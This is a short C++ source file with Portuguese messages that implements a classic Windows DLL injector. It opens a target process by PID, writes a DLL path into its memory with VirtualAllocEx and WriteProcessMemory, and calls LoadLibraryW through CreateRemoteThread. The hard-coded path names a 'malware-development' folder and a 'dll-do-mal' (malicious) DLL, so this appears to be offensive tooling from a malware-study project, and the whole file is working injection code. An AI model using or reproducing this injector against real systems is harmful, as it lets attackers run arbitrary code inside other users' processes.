#include <windows.h>
#include <iostream>

int main(int argc, char *argv[]) {

    if (argc != 2) {
        std::cerr << "Uso: " << argv[0] << " <PID do processo alvo>" << std::endl;
        return 1;
    }

    wchar_t dllPath[] = L"C:\\malware-development\\kitten's den\\dll-injection\\dll-do-mal.dll";

    std::cout << "Injetando DLL no processo com PID: " << atoi(argv[1]) << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    if (hProcess == NULL) {
        std::cerr << "Erro ao abrir o processo: " << GetLastError() << std::endl;
        return 1;
    }

    PVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), MEM_COMMIT, PAGE_READWRITE);
    if (remoteBuffer == NULL) {
        std::cerr << "Erro ao alocar memória no processo remoto: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, remoteBuffer, dllPath, sizeof(dllPath), NULL)) {
        std::cerr << "Erro ao escrever na memória do processo remoto: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    PTHREAD_START_ROUTINE loadLibraryAddr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");

    if (loadLibraryAddr == NULL) {
        std::cerr << "Erro ao obter o endereço de LoadLibraryW: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, loadLibraryAddr, remoteBuffer, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Erro ao criar thread remota: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "DLL injetada com sucesso!" << std::endl;

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}
